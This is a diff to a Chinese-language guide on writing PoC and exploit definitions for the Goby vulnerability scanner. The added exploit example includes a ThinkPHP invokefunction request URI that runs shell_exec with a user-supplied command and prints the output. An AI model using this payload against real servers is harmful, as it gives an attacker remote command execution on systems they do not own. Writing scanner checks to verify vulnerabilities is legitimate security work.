@@ -40,19 +40,49 @@ Goby 是通过 golang 编写的，而一些漏洞检测场景（比如dnslog验�
 
 ### expJson部分
 
+### poc编写
+
+[参考](https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#poc-%E7%BC%96%E5%86%99)
+
+### EXP 编写
+
+  goby还有Verify功能，我们需要增加exp部分才可以在扫描到漏洞之后直接用goby验证，但是这部分没法在gui编写。首先，找到刚才编写的POC自动生成的JSON文件。
 
 
-1、首先通过goby poc管理，添加poc，按照goby官方漏洞描述模版说明填写并保存。
-
-![img](https://p3.ssl.qhimg.com/t010bfe776910c3633b.jpg)
+> 路径：\goby-win-x64-1.8.202\golib\exploits\user
 
 
+exp 例子：
+```
+"HasExp": true				// 是否录入 Exp，如有 Exp，Goby 在扫描到漏洞后会展现出 verify 按钮用以执行 Exp 验证漏洞
+"ExpParams": [				// 前端需要传递给 Exp 的参数，如要执行的命令
+    {
+        "name": "cmd",		// 参数的名称
+        "type": "input",	// 参数输入类型，input 表示需要用户输入，select 表示 Exp 可以提供默认列表让用户进行选择输入内容
+        "value": "whoami"	// 参数的值
+    }
+]
+"ExploitSteps": [
+    "AND",
+    {
+        "Request": {
+            "method": "GET",
+            "uri": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]={{{cmd}}}",					// 通过 {{{参数名称}}} 引用前端传递过来的值
+            "follow_redirect": true,
+            "header": {},
+            "data_type": "text",
+            "data": ""
+        },
+        "SetVariable": ["output|lastbody"]		// 将响应的 HTTP Body 打印出来，展示命令执行效果
+    }
+]
+```
 
-2、在 goby 安装目录的\golib\exploits\user 文件夹打开生成的Apache_Solr_Log4j_JNDI_RCE.json文件，如果不需要 exp 则需把 HasExp 字段的 true 改为 false。
 
 
 
 
 
+## Goby+AWVS看黑客如何躺着挖洞
 
-
+[参考](https://zhuanlan.zhihu.com/p/414104243)
